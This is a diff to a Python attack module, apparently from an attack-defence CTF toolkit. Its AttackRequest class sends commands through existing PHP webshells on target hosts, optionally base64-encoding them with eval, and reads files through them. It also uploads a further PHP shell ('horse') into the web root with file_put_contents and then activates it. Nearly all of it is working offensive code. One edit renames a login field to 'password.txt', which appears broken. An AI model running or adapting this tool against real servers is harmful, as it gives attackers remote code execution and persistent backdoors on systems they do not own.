@@ -5,7 +5,6 @@ import requests
 from config.config import Config
 from libs.OutputColor import Color
 
-
 class AttackRequest:
     def __init__(self):
         self.login = False
@@ -48,7 +47,7 @@ class AttackRequest:
         if self.login:
             login_file = ''
             ip, port = target['ip'], target['port']
-            data = {"username" : '', "password" : ''}
+            data = {"username" : '', "password.txt" : ''}
             url = 'http://{}:{}/{}'.format(ip, port, login_file)
             try:
                 self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
@@ -74,18 +73,22 @@ class AttackRequest:
         if webshell_request == 'GET':
             url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, file_path)
             url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, file_path)
-            print(Color('Please input url1 or url2:', 'yellow').print())
-            while True:
-                inputUrl = input('[+] url_select> ').strip()
-                if inputUrl == 'url1':
-                    url = url1
-                    break
-                elif inputUrl == 'url2':
-                    url = url2
-                    break
-                else:
-                    print(Color('Input error, Please try again!', 'red').print())
-                    continue
+
+            url = url1
+
+            # print(Color('Please input url1 or url2:', 'yellow').print())
+            # while True:
+            #     inputUrl = input('[+] url_select> ').strip()
+            #     if inputUrl == 'url1':
+            #         url = url1
+            #         break
+            #     elif inputUrl == 'url2':
+            #         url = url2
+            #         break
+            #     else:
+            #         print(Color('Input error, Please try again!', 'red').print())
+            #         continue
+
             try:
                 response = self.session.get(url=url, headers=self.headers, proxies=Config.proxy, timeout=4)
             except requests.Timeout:
@@ -93,7 +96,7 @@ class AttackRequest:
 
         elif webshell_request == 'POST' or 'REQUEST':
             url = 'http://{}:{}/{}'.format(ip, port, webshell_path)
-            data = {webshell_passwd: payload}
+            data = {webshell_passwd: file_path}
             try:
                 response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
             except requests.Timeout:
@@ -106,6 +109,10 @@ class AttackRequest:
 
 
     def handle_execute_command(self, target, webshell, payload):
+        global url
+        global result
+        global response
+
         webshell_path = webshell['WebShell_path']
         webshell_type = webshell['WebShell_type']
         webshell_passwd = webshell['WebShell_passwd']
@@ -113,31 +120,32 @@ class AttackRequest:
         ip, port = target['ip'], target['port']
 
         self.handle_login(target)
-
         if webshell_type == 'eval' or webshell_type == 'assert':
-            payload = 'printf(\'*----START----*\');' + payload + ';printf(\'*----END----*\');'
+            payload = "printf('*----START----*');" + payload + ";printf('*----END----*');"
             if Config.shellBase64Encode:
                 payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())
         else:
-            payload = 'echo \'*----START----*\'' + payload + ';echo \'*----END----*\';'
+            payload = "echo '*----START----*'" + payload + ";echo '*----END----*';"
 
-        url = None
-        response = None
         if webshell_request == 'GET':
             url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
             url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
-            print(Color('Please input url1 or url2:', 'yellow').print())
-            while True:
-                inputUrl = input('[+] url_select> ').strip()
-                if inputUrl == 'url1':
-                    url = url1
-                    break
-                elif inputUrl == 'url2':
-                    url = url2
-                    break
-                else:
-                    print(Color('Input error, Please try again!', 'red').print())
-                    continue
+
+            url = url1
+
+            # print(Color('Please input url1 or url2:', 'yellow').print())
+            # while True:
+            #     inputUrl = input('[+] url_select> ').strip()
+            #     if inputUrl == 'url1':
+            #         url = url1
+            #         break
+            #     elif inputUrl == 'url2':
+            #         url = url2
+            #         break
+            #     else:
+            #         print(Color('Input error, Please try again!', 'red').print())
+            #         continue
+
             try:
                 response = self.session.get(url=url, headers=self.headers, proxies=Config.proxy, timeout=4)
             except requests.Timeout:
@@ -150,7 +158,6 @@ class AttackRequest:
             except requests.Timeout:
                 print(Color('Connect failed, Timeout!', 'red').print())
 
-        result = None
         if response:
             result = self.handle_response(response)
             if result or result == '':
@@ -164,6 +171,7 @@ class AttackRequest:
 
     def handle_upload_horse(self, target, webshell, horse_name):
         global url
+        global result
         global payload
         global response
 
@@ -173,47 +181,60 @@ class AttackRequest:
         webshell_request = webshell['WebShell_Request']
         ip, port = target['ip'], target['port']
 
-        horse_content = open('horse/' + str(horse_name) + '.php', 'rb').read()
-        horse_b64content = base64.b64encode(horse_content).decode()
+        if webshell_type == 'eval' or webshell_type == 'assert':
+            horse_content = open('horse/' + str(horse_name) + '.php', 'rb').read()
+            horse_b64content = base64.b64encode(horse_content).decode()
+            payload = "file_put_contents('{}', base64_decode('{}'));".format(Config.horse_name, horse_b64content)
+        # elif webshell_type == 'system':
+        #     horse_content = open('horse/' + str(horse_name) + '.sh', 'rb').read()
 
         self.handle_login(target)
 
-        if webshell_request == 'GET':
-            payload = 'var_dump(file_put_contents(\'/var/www/html/h3rmesk1t.php\', base64_decode(file_get_contents(\'php://input\'))));'
-        else:
-            payload = 'var_dump(file_put_contents(\'var/www/html/h3rmesk1t.php\', base64_decode(\'{}\')))'.format(horse_b64content)
-
         if Config.shellBase64Encode:
-            payload = 'eval(base64_decode("{}"));'.format(base64.b64encode(payload.encode()).decode())
-
+            payload = "eval(base64_decode('{}'));".format(base64.b64encode(payload.encode()).decode())
 
         if webshell_request == 'GET':
             url1 = 'http://{}:{}/{}?{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
             url2 = 'http://{}:{}/{}&{}={}'.format(ip, port, webshell_path, webshell_passwd, payload)
-            print(Color('Please input url1 or url2:', 'yellow').print())
-            while True:
-                inputUrl = input('[+] url_select> ').strip()
-                if inputUrl == 'url1':
-                    url = url1
-                    break
-                elif inputUrl == 'url2':
-                    url = url2
-                    break
-                else:
-                    print(Color('Input error, Please try again!', 'red').print())
-                    continue
-            data = horse_b64content
+
+            url = url1
+
+            # print(Color('Please input url1 or url2:', 'yellow').print())
+            # while True:
+            #     inputUrl = input('[+] url_select> ').strip()
+            #     if inputUrl == 'url1':
+            #         url = url1
+            #         break
+            #     elif inputUrl == 'url2':
+            #         url = url2
+            #         break
+            #     else:
+            #         print(Color('Input error, Please try again!', 'red').print())
+            #         continue
+
+            try:
+                print(url)
+                response = self.session.get(url=url, headers=self.headers, proxies=Config.proxy, timeout=4)
+                print(response.status_code)
+            except requests.Timeout:
+                print(Color('Connect failed, Timeout!', 'red').print())
+                return False
         else:
             url = 'http://{}:{}/{}'.format(ip, port, webshell_path)
             data = {webshell_passwd : horse_b64content}
+            try:
+                response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
+            except requests.Timeout:
+                print(Color('Connect failed, Timeout!', 'red').print())
+                return False
 
-        try:
-            response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
-        except requests.Timeout:
-            print(Color('Connect failed, Timeout!', 'red').print())
-            return False
+        # try:
+        #     response = self.session.post(url=url, data=data, headers=self.headers, proxies=Config.proxy, timeout=4)
+        # except requests.Timeout:
+        #     print(Color('Connect failed, Timeout!', 'red').print())
+        #     return False
 
-        if 'int({})'.format(len(horse_content)) in response.content.decode('utf-8', 'replace'):
+        if response.status_code == 200:
             print(Color('Upload Successfully!', 'blue').print())
             self.active_horse(ip, port)
         else:
@@ -225,6 +246,8 @@ class AttackRequest:
         tgs_horse_path = input('[+] target\'s_horse_path> ').strip()
         url = 'http://{}:{}/{}'.format(ip, port, tgs_horse_path)
         res = requests.get(url=url, headers=self.headers)
+        print(url)
+        print(res.status_code)
         if res.status_code == 200:
             print(Color('Active Successfully!', 'blue').print())
             return True
